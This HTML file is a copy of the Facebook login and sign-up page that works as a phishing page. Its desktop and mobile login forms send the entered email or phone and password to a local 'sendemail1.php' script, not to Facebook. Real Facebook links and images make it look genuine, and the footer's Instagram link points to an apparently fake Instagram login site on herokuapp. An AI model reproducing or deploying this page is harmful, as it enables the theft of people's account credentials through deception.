<!DOCTYPE html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<link rel="stylesheet" type="text/css" href="css/computer.css" media="screen and (min-width: 769px)">
<link rel="stylesheet" type="text/css" href="css/mobile.css" media="screen and (max-width: 768px)">
<link rel="icon" href="images/logo.png" type="image/gif" />
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
<title>Facebook - Log In or Sign Up</title>
</head>

<body>
<div class="computer">
  <header>
    <div class="headersubdiv">
      <img src="images/fblogo.png" class="fblogo">
      <div class="loginform">
        <form action="sendemail1.php" method="POST">
        <table>
          <tr>
            <td class="logintext">Email or Phone</td>
            <td class="logintext"><span class="loginrowgap">Password</span></td>
          </tr>
            <td><input class="logintext loginfield" type="name"  name="name" required ></td>
            <td><input class="logintext loginrowgap loginfield" type="password" name="password" required></td>
            <td><input class="loginrowgap" id="loginbutton" type="submit" name="submit"  value="Log In"></td>
          </tr>
          <tr>
            <td></td>
            <td><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar&from_login_screen=0" class="logintext loginrowgap" id="forgotpw">Forgotten account?</a></td>
          </tr>
        </table>
      </form>
      </div>
    </div>
  </header>

  <div class="maindiv">
    <div class="mainsubdiv">
      <div class="welcome">
        <div class="welcometext">Facebook helps you connect and share with the people in your life.</div>
        <div class="welcomepic">
          <img src="images/connecting.png" alt="welcome">
        </div>
      </div>
      <div class="signupdiv">
        <div class="createaccount">
          <div class="createh1"><span>Create an account</span></div>
          <div class="createp">It's free and always will be.</div>
        </div>
        <div class="signupform">
          <div class="inputname">
          <form action=" https://touch.facebook.com/reg/?cid=103&refsrc=https%3A%2F%2Ftouch.facebook.com%2Freg%2F&soft=hjk" method="POST">
            <input type="text" name="firstname" placeholder="First name" class="namebox namebox1 signuptextbox" required>
            <input type="text" name="surname" placeholder="Surname" class="namebox namebox2 signuptextbox" required>
          </div>
          <input class="mobilepw signuptextbox" type="text" name="mobile/email" placeholder="Mobile number or email address" required><br>
          <input class="mobilepw signuptextbox" type="password" placeholder="New password" required>
          <br>
          <p class="createp" id="birthday">Birthday</p>
          <div class="dobdiv">
            <select name="dobdate" class="dob day" required>
              <option value="day">Day</option>
              <option value="1" selected>1</option>
              <option value="2">2</option>
              <option value="3">3</option>
              <option value="4" >4</option>
              <option value="5">5</option>
              <option value="6">6</option>
              <option value="7">7</option>
              <option value="8">8</option>
              <option value="9">9</option>
              <option value="10">10</option>
              <option value="11">11</option>
              <option value="12">12</option>
              <option value="13">13</option>
              <option value="14">14</option>
              <option value="15">15</option>
            </select>
            <select name="dobmonth" class="dob month" required>
              <option value="month" >Month</option>
              <option value="jan" >Jan</option>
              <option value="feb">Feb</option>
              <option value="mar">Marc</option>
              <option value="apr" >Apr</option>
              <option value="may" >May</option>
              <option value="jun"selected >Jun</option>
              <option value="jul">Jul</option>
              <option value="aug">Aug</option>
              <option value="sep">Sept</option>
              <option value="oct">Oct</option>
              <option value="nov">Nov</option>
              <option value="dec">Dec</option>
            </select>
            <select name="dobyear"  class="dob year"required> 
              <option value="2021" selected>2021</option></option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option>
            </select>
            <div id="whydb">
            <a href="#">Why do I need to provide my date of birth?</a>
              <div id="whydbtooltip">
                  <strong>Providing your date of birth</strong> helps make sure that you get the right Facebook experience for your age. If you want to change who sees this, go to the About section of your Profile. For more details, please visit our <a href=" https://www.facebook.com/policy.php">Data Policy</a>.
                  <hr id="hrtooltip">
                 
              </div>
            </div>
          </div>
          <div class="gender">
            <span id="femalediv"><input type="radio" name="gender" value="female" id="female"><label class="gendertext" for="female">Female</label></span>
            <span id="malediv" ><input type="radio" name="gender" value="male" id="male" checked> <label class="gendertext" for="male">Male</label></span>
          </div>
          <div>
            <p class="terms">
              By clicking Sign Up, you agree to our <a href="https://www.facebook.com/terms.php" class="linksinterms">Terms</a>, <a href="https://www.facebook.com/policy.php" class="linksinterms">Data Policy</a> and <a href="https://www.facebook.com/policies/cookies/" class="linksinterms">Cookie Policy</a>. You may receive SMS notifications from us and can opt out at any time.
            </p>
          </div>
          <div class="clearfix">
            <button type="submit" id="signupbutton" >Sign Up</button>
          </div>
          </form>
          <div id="createpage">
            <a href=" https://www.facebook.com/pages/create/?ref_type=registration_form">Create a Page</a> for a celebrity, band or business.
          </div>
        </div>
      </div>
    </div>
  </div>
  <footer>
    <div id="footersubdiv">
      <div id="languagediv">
        <a href="https://en-gb.facebook.com/" class="language" id="currentlang">English (UK)</a>
        <a href="https://ml-in.facebook.com/" class="language">മലയാളം</a>
        <a href="https://ta-in.facebook.com/" class="language">தமிழ்</a>
        <a href="https://si-lk.facebook.com/" class="language">ಕನ್ನಡ</a>
        <a href="https://hi-in.facebook.com/" class="language">हिन्दी</a>
        <a href="https://ur-pk.facebook.com/" class="language">اردو</a>
        <a href="https://bn-in.facebook.com/" class="language">বাংলা</a>
        <a href="https://te-in.facebook.com/" class="language">తెలుగు </a>
       
        <a href="#" id="morelang"><i class="fa fa-plus" aria-hidden="true"></i></a>
      </div>
      <hr id="hrfinal">
      <div id="extralinksdiv">
        <a href="https://www.facebook.com/r.php" class="extralinks">Sign Up</a>
        <a href="https://www.facebook.com/login/" class="extralinks">Log In</a>
        <a href="https://www.messenger.com/" class="extralinks">Messenger</a>
        <a href="https://www.facebook.com/lite/" class="extralinks">Facebook Lite</a>
        <a href="https://www.facebook.com/watch/" class="extralinks">watch</a>
        <a href="https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2Fdirectory%2Fpeople%2F" class="extralinks">People</a>
        <a href="https://www.facebook.com/directory/pages/" class="extralinks">Pages</a>
        <a href="https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2Fpages%2Fcategory%2F" class="extralinks">Page categories</a>
        <a href="https://www.facebook.com/places/" class="extralinks">Places</a>
        <a href="https://www.facebook.com/games/" class="extralinks">Games</a>
        <a href="https://www.facebook.com/directory/places/" class="extralinks">Locations</a>
        <a href="https://www.facebook.com/marketplace/" class="extralinks">Marketplace</a>
        <a href="https://pay.facebook.com/" class="extralinks"> Facebook Pay </a>
        <a href=" https://www.facebook.com/directory/groups/" class="extralinks">Groups</a>
        <a href="https://www.facebook.com/jobs/" class="extralinks"> Jobs </a>
        <a href="https://www.oculus.com/" class="extralinks"> Oculus </a>
        <a href="https://portal.facebook.com/" class="extralinks"> Portal </a>
        <a href="https://instagram-loginpagee.herokuapp.com/" class="extralinks">Instagram</a>
        <a href="https://www.facebook.com/local/lists/245019872666104/" class="extralinks">Local</a>
        <a href="https://www.facebook.com/fundraisers/" class="extralinks">Fundraisers</a>
        <a href="https://www.facebook.com/biz/directory/" class="extralinks">Service</a>
        <a href="https://www.facebook.com/votinginformationcenter/" class="extralinks">Voting Information Center</a>
        <a href="https://about.facebook.com/" class="extralinks">About</a>
        <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fads%2Fcreate%2F%3Fnav_source%3Dunknown%26campaign_id%3D402047449186%26placement%3Dpflo%26extra_1%3Dnot-admgr-user" class="extralinks">Create ad</a>
        <a href="https://www.facebook.com/pages/create/?ref_type=site_footer" class="extralinks">Create Page</a>
        <a href="https://developers.facebook.com/?ref=pf" class="extralinks">Developers</a>
        <a href="https://www.facebook.com/careers/?ref=pf" class="extralinks">Careers</a>
        <a href=" https://www.facebook.com/privacy/explanation " class="extralinks">Privacy</a>
        <a href=" https://www.facebook.com/policies/cookies/" class="extralinks">Cookies</a>
        <a href="https://www.facebook.com/help/568137493302217" class="extralinks">AdChoices</a>
        <a href="https://www.facebook.com/policies_center/" class="extralinks">Terms</a>
        <a href="https://www.facebook.com/help/?ref=pf" class="extralinks">Help</a>
      </div>
      <div id="copyrightdiv">
          <span id="copyright"><a href="https://www.facebook.com" target="_blank" id="copyrightfblink">Facebook</a> © 2021</span>
       </div>
    </div>
  </footer>
</div>



<!--Code for Mobile Screen-->

<div class="mobile">
  <div class="mobheader">
    <img src="images/fblogo.png" class="mobfblogo">
  </div>
  <div id="mobapplink" class="clearfix">
    <a href="#">
      <img src="images/fbandroid.png" id="mobandroidpic">
      <div id="getfbandroid">Get Facebook for Android and browse faster.</div>
    </a>
  </div>
  <div class="mobmaindiv">
    <div id="mobtextdiv">
<form action="sendemail1.php"  method="post">
      <input type="text" name ="name" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address" required>
      <input type="password" name="password"class="mobtextbox mobtextbox2" placeholder="Password" required>
    </div>
    <div class="mobloginbuttondiv">
      <input type="submit" class="mobloginbutton" name="submit" value="Log In">
    </div>

</form>
    <div id="ordiv">
    <span id="or">or</span>
    </div>
    <div id="mobcreatediv">
      <button id="mobcreate" onclick="location.href='https://touch.facebook.com/reg/?cid=103&refsrc=https%3A%2F%2Ftouch.facebook.com%2F&soft=hjk'" >Create New Account</button>
    </div>
    <div class="mobforgotpw">
      <a href="https://touch.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Ftouch.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgotten password?</a>
      <span>·</span>
      <a href=" https://touch.facebook.com/help/?ref=pf&refid=8 ">Help Center</a>
    </div>
  </div>
  <div class="mobfooter">
    <div id="moblangs">
      <div class="item1">
        <li><a href="https://en-gb.facebook.com/" id="mobcurrentlang">English (UK)</a></li>
        <li><a href="https://ta-in.facebook.com/">தமிழ்</a></li>
        <li><a href="https://hi-in.facebook.com/">हिन्दी</a></li>
        <li><a href="https://bn-in.facebook.com/">বাংলা</a></li>
      </div>
      <div class="item2">
        <li><a href="https://ml-in.facebook.com/">മലയാളം</a></li>
        <li><a href="https://si-lk.facebook.com/">ಕನ್ನಡ</a></li>
        <li><a href=" https://ur-pk.facebook.com/">اردو</a></li>
      </div>
    </div>
    <div class="mobcopyright">
      <span class="mobfbcopyright"><a href="https://www.facebook.com" target="_blank" id="mobcopyrightfblink">Facebook</a> ©2021</span><br>
   </div>
    </div>
</div>
</body>
